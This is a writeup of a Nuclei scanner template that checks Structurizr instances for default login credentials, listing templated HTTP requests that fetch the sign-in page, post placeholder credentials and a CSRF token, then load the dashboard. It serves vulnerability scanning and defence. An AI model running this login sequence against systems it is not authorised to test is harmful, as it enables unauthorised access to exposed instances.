# Nuclei Template: Structurizr - Default Login
**Template ID:** structurizr-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`structurizr-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Structurizr contains default credentials.

## Steps to reproduce / Exploit Payload
```http
GET /signin HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&_csrf={{csrf}}&hash=

GET /dashboard HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

## References
- https://docs.structurizr.com/onpremises/quickstart
